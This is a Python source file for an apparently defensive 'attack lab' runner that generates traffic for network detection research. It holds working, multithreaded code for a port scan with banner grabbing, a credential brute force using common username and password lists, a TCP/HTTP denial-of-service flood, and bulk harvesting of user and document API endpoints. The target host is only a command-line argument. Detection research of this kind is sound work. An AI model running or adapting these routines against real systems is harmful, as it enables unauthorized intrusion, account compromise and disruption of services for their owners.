"""
NetWatch Attack Lab — Attack Simulation Runner.

Generates realistic network attack traffic against the target server (10.0.0.2:8080 or localhost:8080).
Produces characteristic network signatures (port entropy, SYN/ACK asymmetry, packet velocity,
brute force auth bursts, data exfiltration) for live TShark detection and Cyber World Model forecasting.
"""

import argparse
import concurrent.futures
import json
import logging
import random
import socket
import time
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime
from typing import Callable, Dict, List, Optional

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] [AttackRunner] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("attack_runner")

COMMON_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995,
    1433, 1521, 2049, 3306, 3389, 5000, 5432, 5900, 6379, 8000, 8080,
    8443, 8888, 9000, 9090, 9200, 27017,
]

USERNAMES = [
    "admin", "root", "administrator", "user", "test", "guest", "service",
    "backup", "postgres", "oracle", "manager", "support", "rithik", "developer",
]

PASSWORDS = [
    "123456", "password", "admin123", "letmein", "Welcome1!", "root123",
    "toor", "pass1234", "qwerty", "company2026", "secret", "master",
    "test123", "supersecret", "SecretCorp2026!",
]


class AttackSession:
    """Manages an active attack execution with logging and progress reporting."""

    def __init__(self, attack_type: str, target_ip: str, target_port: int,
                 duration: int = 15, intensity: str = "medium",
                 log_callback: Optional[Callable[[str], None]] = None):
        self.attack_type = attack_type
        self.target_ip = target_ip
        self.target_port = target_port
        self.duration = duration
        self.intensity = intensity
        self.log_callback = log_callback
        self.is_running = False
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_time = 0.0
        self.end_time = 0.0
        self.logs: List[str] = []

    def log(self, message: str):
        timestamp = datetime.now().strftime("%H:%M:%S")
        formatted = f"[{timestamp}] {message}"
        self.logs.append(formatted)
        logger.info(message)
        if self.log_callback:
            try:
                self.log_callback(formatted)
            except Exception:
                pass

    def stop(self):
        self.is_running = False
        self.log("Attack execution requested to STOP.")

    def run(self) -> Dict:
        self.is_running = True
        self.start_time = time.time()
        self.log(f"Starting {self.attack_type.upper()} attack against {self.target_ip}:{self.target_port} (Duration: {self.duration}s, Intensity: {self.intensity})")

        try:
            if self.attack_type == "recon":
                self._run_recon()
            elif self.attack_type == "bruteforce":
                self._run_bruteforce()
            elif self.attack_type == "dos":
                self._run_dos()
            elif self.attack_type == "exfiltration":
                self._run_exfiltration()
            else:
                self.log(f"Unknown attack type: {self.attack_type}")
        except Exception as e:
            self.log(f"Error during attack execution: {e}")
        finally:
            self.is_running = False
            self.end_time = time.time()
            elapsed = round(self.end_time - self.start_time, 2)
            self.log(f"Attack {self.attack_type.upper()} finished. Sent {self.packets_sent} packets/requests in {elapsed}s.")

        return {
            "attack_type": self.attack_type,
            "target_ip": self.target_ip,
            "target_port": self.target_port,
            "packets_sent": self.packets_sent,
            "bytes_sent": self.bytes_sent,
            "elapsed_seconds": round(time.time() - self.start_time, 2),
            "logs": self.logs,
        }

    # ── 1. Reconnaissance (Port Scan) ─────────────────────────────────────────
    def _run_recon(self):
        """Scans ports with TCP connect probes to create fan-out and entropy shifts."""
        self.log("[Recon] Initiating TCP port scan across common enterprise ports & ranges...")

        # Build list of ports
        ports_to_scan = list(COMMON_PORTS)
        # Add random high ports to generate dispersion
        additional = [random.randint(1024, 65535) for _ in range(50)]
        # Add sequential range around target port
        sequential = list(range(max(1, self.target_port - 20), min(65535, self.target_port + 20)))
        all_ports = list(dict.fromkeys(ports_to_scan + sequential + additional))
        random.shuffle(all_ports)

        open_ports = []
        closed_ports = []

        delay = 0.02 if self.intensity == "high" else 0.08

        deadline = self.start_time + self.duration
        for port in all_ports:
            if not self.is_running or time.time() > deadline:
                break

            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.15)
                res = s.connect_ex((self.target_ip, port))
                self.packets_sent += 1
                self.bytes_sent += 60  # approx SYN frame

                if res == 0:
                    open_ports.append(port)
                    self.log(f"[Recon] Port {port}/TCP is OPEN on {self.target_ip}")
                    # If web port, send brief banner grab probe
                    try:
                        s.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
                        self.bytes_sent += 20
                    except Exception:
                        pass
                else:
                    closed_ports.append(port)
                s.close()
            except Exception:
                closed_ports.append(port)

            if len(all_ports) % 10 == 0:
                time.sleep(delay)

        self.log(f"[Recon] Scan complete. Found {len(open_ports)} OPEN ports, {len(closed_ports)} closed ports.")

    # ── 2. Brute Force (Credential Stuffing) ──────────────────────────────────
    def _run_bruteforce(self):
        """Hammers the target login endpoint with rapid credential attempts."""
        url = f"http://{self.target_ip}:{self.target_port}/login"
        self.log(f"[BruteForce] Initiating authentication brute force against {url}")

        workers = 6 if self.intensity == "high" else 3
        delay = 0.05 if self.intensity == "high" else 0.15
        deadline = self.start_time + self.duration

        combinations = []
        for u in USERNAMES:
            for p in PASSWORDS:
                combinations.append((u, p))
        random.shuffle(combinations)

        def attempt_login(cred):
            if not self.is_running or time.time() > deadline:
                return None
            user, pwd = cred
            data = urllib.parse.urlencode({"username": user, "password": pwd}).encode("utf-8")
            req = urllib.request.Request(
                url,
                data=data,
                headers={
                    "User-Agent": f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AttackLab/{random.randint(1, 9)}",
                    "Content-Type": "application/x-www-form-urlencoded",
                },
            )
            try:
                with urllib.request.urlopen(req, timeout=1.5) as resp:
                    self.packets_sent += 6  # TCP handshake + HTTP request/response
                    self.bytes_sent += len(data) + 200
                    return (user, pwd, resp.getcode(), "SUCCESS")
            except urllib.error.HTTPError as e:
                self.packets_sent += 6
                self.bytes_sent += len(data) + 200
                return (user, pwd, e.code, "FAILED")
            except Exception as e:
                return (user, pwd, 0, str(e))

        idx = 0
        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            while self.is_running and time.time() < deadline and idx < len(combinations):
                batch = combinations[idx : idx + workers * 2]
                idx += len(batch)
                futures = [executor.submit(attempt_login, c) for c in batch]
                for f in concurrent.futures.as_completed(futures):
                    res = f.result()
                    if res:
                        u, p, code, outcome = res
                        if outcome == "SUCCESS":
                            self.log(f"[BruteForce] [!] AUTH SUCCESS: '{u}':'{p}' -> HTTP {code}")
                        else:
                            self.log(f"[BruteForce] Attempt '{u}':'{p}' -> HTTP {code} ({outcome})")
                time.sleep(delay)

    # ── 3. DoS Flood (Traffic Volume & TCP Asymmetry) ─────────────────────────
    def _run_dos(self):
        """Generates high-rate TCP connection bursts and HTTP traffic spikes."""
        url = f"http://{self.target_ip}:{self.target_port}/"
        self.log(f"[DoS] Launching TCP & HTTP traffic flood against {self.target_ip}:{self.target_port}")

        workers = 8 if self.intensity == "high" else 4
        deadline = self.start_time + self.duration

        def flood_worker():
            local_sent = 0
            while self.is_running and time.time() < deadline:
                if random.random() < 0.6:
                    try:
                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.settimeout(0.3)
                        s.connect((self.target_ip, self.target_port))
                        s.sendall(b"GET / HTTP/1.1\r\nHost: " + self.target_ip.encode() + b"\r\nConnection: close\r\n\r\n")
                        self.packets_sent += 4
                        self.bytes_sent += 120
                        local_sent += 1
                        try:
                            s.recv(256)
                        except Exception:
                            pass
                        s.close()
                    except Exception:
                        self.packets_sent += 1
                else:
                    try:
                        req = urllib.request.Request(
                            url,
                            headers={
                                "User-Agent": f"StressWorker/{random.randint(100, 999)}",
                                "Connection": "close",
                            },
                        )
                        with urllib.request.urlopen(req, timeout=1.0) as resp:
                            resp.read(128)
                            self.packets_sent += 4
                            self.bytes_sent += 150
                            local_sent += 1
                    except Exception:
                        pass
                time.sleep(0.01 if self.intensity == "high" else 0.03)
            return local_sent

        with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as executor:
            futures = [executor.submit(flood_worker) for _ in range(workers)]
            while self.is_running and time.time() < deadline:
                self.log(f"[DoS] Active flood in progress: {self.packets_sent} packets generated...")
                time.sleep(1.5)
            concurrent.futures.wait(futures)

    # ── 4. Data Exfiltration ──────────────────────────────────────────────────
    def _run_exfiltration(self):
        """Simulates rapid unauthorized data access and exfiltration transfers."""
        self.log("[Exfiltration] Simulating sensitive directory harvesting and document staging...")
        endpoints = [
            f"http://{self.target_ip}:{self.target_port}/api/users",
            f"http://{self.target_ip}:{self.target_port}/api/documents",
            f"http://{self.target_ip}:{self.target_port}/api/status",
        ]
        deadline = self.start_time + self.duration

        while self.is_running and time.time() < deadline:
            for ep in endpoints:
                if not self.is_running or time.time() > deadline:
                    break
                try:
                    req = urllib.request.Request(
                        ep,
                        headers={
                            "User-Agent": "ExfilAgent/2.0 (CustomPayloadStream)",
                            "X-Exfil-Session": f"sess_{random.randint(1000, 9999)}",
                            "Connection": "close",
                        },
                    )
                    with urllib.request.urlopen(req, timeout=1.5) as resp:
                        content = resp.read()
                        self.packets_sent += 5
                        self.bytes_sent += len(content) + 150
                        self.log(f"[Exfiltration] Harvested endpoint {ep} -> {len(content)} bytes extracted.")
                except Exception as e:
                    self.log(f"[Exfiltration] Endpoint request failed: {e}")
                time.sleep(0.3)


def main():
    parser = argparse.ArgumentParser(description="NetWatch Attack Lab Simulation Runner")
    parser.add_argument("--attack", choices=["recon", "bruteforce", "dos", "exfiltration"], default="recon", help="Attack vector to simulate")
    parser.add_argument("--target-ip", default="10.0.0.2", help="Target IP address (default: 10.0.0.2)")
    parser.add_argument("--target-port", type=int, default=8080, help="Target Port (default: 8080)")
    parser.add_argument("--duration", type=int, default=15, help="Attack duration in seconds (default: 15)")
    parser.add_argument("--intensity", choices=["low", "medium", "high"], default="medium", help="Attack intensity")
    args = parser.parse_args()

    # If 10.0.0.2 is not reachable, test 127.0.0.1 fallback
    target_ip = args.target_ip
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.5)
        if s.connect_ex((target_ip, args.target_port)) != 0:
            # Check if 127.0.0.1 is available
            s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s2.settimeout(0.5)
            if s2.connect_ex(("127.0.0.1", args.target_port)) == 0:
                logger.info(f"Target {target_ip}:{args.target_port} not reachable, falling back to 127.0.0.1:{args.target_port}")
                target_ip = "127.0.0.1"
            s2.close()
        s.close()
    except Exception:
        pass

    session = AttackSession(
        attack_type=args.attack,
        target_ip=target_ip,
        target_port=args.target_port,
        duration=args.duration,
        intensity=args.intensity,
    )

    results = session.run()
    print("\n--- Summary Results ---")
    print(json.dumps({k: v for k, v in results.items() if k != "logs"}, indent=2))


if __name__ == "__main__":
    main()
